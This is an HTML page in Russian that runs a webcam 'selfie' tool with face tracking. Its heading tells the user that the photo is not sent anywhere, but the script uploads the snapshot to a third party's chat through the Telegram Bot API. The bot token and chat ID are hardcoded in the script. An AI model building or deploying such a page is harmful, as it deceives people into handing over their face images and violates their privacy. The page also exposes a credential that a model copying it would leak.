<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Селфи с отправкой в Telegram</title>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/tracking.js/1.1.3/tracking-min.js"></script>
  <style>
    body {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      font-family: Arial, sans-serif;
      background-color: #f0f0f0;
      margin: 0;
      padding: 0;
      height: 100vh;
      overflow: hidden;
    }
    #container {
      position: relative;
      width: 100vw;
      height: 60vh;
      max-width: 640px;
      max-height: 480px;
    }
    #video, #canvas {
      width: 100%;
      height: 100%;
      object-fit: cover;
      border-radius: 10px;
    }
    #canvas {
      position: absolute;
      top: 0;
      left: 0;
    }
    #originalCanvas {
      display: none;
    }
    h1 {
      color: #333;
      font-size: 1.2em;
      margin: 10px 0;
      text-align: center;
    }
    button {
      margin-top: 20px;
      padding: 20px 40px;
      font-size: 20px;
      background-color: #28a745;
      color: white;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      touch-action: manipulation;
    }
    button:hover {
      background-color: #218838;
    }
    #status {
      margin-top: 10px;
      font-size: 16px;
      color: #333;
      text-align: center;
    }
    @media (orientation: landscape) {
      #container {
        height: 100vh;
        width: 133.33vh;
        max-width: none;
        max-height: none;
      }
    }
  </style>
</head>
<body>
  <h1>Фотка никуда не отправляется</h1>
  <div id="container">
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>
    <canvas id="originalCanvas"></canvas>
  </div>
  <button onclick="takeSnapshot()">Нажми, когда готов!</button>
  <div id="status">Покажи лицо в кадре!</div>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const originalCanvas = document.getElementById('originalCanvas');
    const ctx = canvas.getContext('2d');
    const originalCtx = originalCanvas.getContext('2d');
    const statusDiv = document.getElementById('status');

    // Настройка Telegram
    const telegramBotToken = '8129102478:AAFiIabXWiPI5Aeqqh7jEqXgUKLE6-NalA0';
    const chatId = '1753361154';

    // Запуск камеры
    async function startCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: 'user' }
        });
        video.srcObject = stream;
        video.onloadedmetadata = () => {
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          originalCanvas.width = video.videoWidth;
          originalCanvas.height = video.videoHeight;
          startTracking();
          drawFrame();
        };
      } catch (err) {
        console.error('Ошибка доступа к камере:', err);
        statusDiv.textContent = 'Не удалось получить доступ к камере. Используйте HTTPS или localhost.';
      }
    }

    // Рисуем зеленую рамку
    function drawFrame() {
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      ctx.strokeStyle = 'rgba(40, 167, 69, 0.7)';
      ctx.lineWidth = 10;
      ctx.strokeRect(10, 10, canvas.width - 20, canvas.height - 20);
      requestAnimationFrame(drawFrame);
    }

    // Отслеживание лица
    function startTracking() {
      const tracker = new tracking.ObjectTracker('face');
      tracker.setInitialScale(4);
      tracker.setStepSize(2);
      tracker.setEdgesDensity(0.1);
      tracking.track('#video', tracker, { camera: true });

      tracker.on('track', function(event) {
        if (event.data.length > 0) {
          statusDiv.textContent = 'Лицо в кадре! Нажми кнопку!';
          statusDiv.style.color = '#28a745';
        } else {
          statusDiv.textContent = 'Покажи лицо в кадре!';
          statusDiv.style.color = '#333';
        }
      });
    }

    // Снимок без эффектов и отправка в Telegram
    async function takeSnapshot() {
      statusDiv.textContent = 'Захват снимка...';
      originalCtx.drawImage(video, 0, 0, originalCanvas.width, originalCanvas.height);
      originalCanvas.toBlob(async (blob) => {
        statusDiv.textContent = 'Отправка фото в Telegram...';
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', blob, 'snapshot.jpg');
        try {
          const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
            method: 'POST',
            body: formData
          });
          const result = await response.json();
          statusDiv.textContent = result.ok ? 'Фото успешно отправлено!' : 'Ошибка: ' + result.description;
        } catch (err) {
          console.error('Ошибка:', err);
          statusDiv.textContent = 'Не удалось отправить фото. Проверьте подключение.';
        }
      }, 'image/jpeg');
    }

    // Запуск камеры
    startCamera();
  </script>
</body>
</html>
